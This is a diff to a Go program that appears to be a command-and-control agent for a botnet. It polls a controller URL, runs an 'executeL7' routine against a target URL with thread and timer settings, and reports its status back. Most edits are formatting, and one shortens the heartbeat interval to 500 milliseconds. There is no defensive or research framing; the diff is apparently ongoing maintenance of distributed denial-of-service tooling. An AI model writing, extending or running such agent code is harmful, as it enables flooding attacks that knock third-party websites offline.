@@ -11,6 +11,7 @@ import (
 	"fmt"
 	"io"
 	"log"
+	"math/rand"
 	"net"
 	"net/http"
 	"os"
@@ -21,7 +22,6 @@ import (
 	"sync"
 	"syscall"
 	"time"
-	"math/rand"
 )
 
 type Command struct {
@@ -33,10 +33,10 @@ type Command struct {
 }
 
 var (
-	mu       sync.Mutex
-	status   = "Ready"
-	currCmd  *exec.Cmd
-	randSrc  = rand.New(rand.NewSource(time.Now().UnixNano()))
+	mu      sync.Mutex
+	status  = "Ready"
+	currCmd *exec.Cmd
+	randSrc = rand.New(rand.NewSource(time.Now().UnixNano()))
 
 	httpClient = &http.Client{
 		Timeout: 10 * time.Second,
@@ -92,7 +92,9 @@ func executeL7(controlURL, agentID, url string, threads, timer int, customHost s
 
 	if err := cmd.Start(); err != nil {
 		log.Printf("[AGENT] l7 start error: %v", err)
-		mu.Lock(); status = "Error"; mu.Unlock()
+		mu.Lock()
+		status = "Error"
+		mu.Unlock()
 		reportStatus(controlURL, agentID)
 		return
 	}
@@ -129,7 +131,7 @@ func listenForCommands(controlURL, agentID string) {
 
 		resp, err := client.Do(req)
 		if err != nil {
-			j := time.Duration(randSrc.Int63n(int64(backoff/5)))
+			j := time.Duration(randSrc.Int63n(int64(backoff / 5)))
 			time.Sleep(backoff + j)
 			backoff *= 2
 			if backoff > 10*time.Second {
@@ -230,7 +232,7 @@ func main() {
 	go listenForCommands(controlURL, agentID)
 	// periodic heartbeat
 	go func() {
-		t := time.NewTicker(1 * time.Second)
+		t := time.NewTicker(500 * time.Millisecond)
 		defer t.Stop()
 		for range t.C {
 			reportStatus(controlURL, agentID)
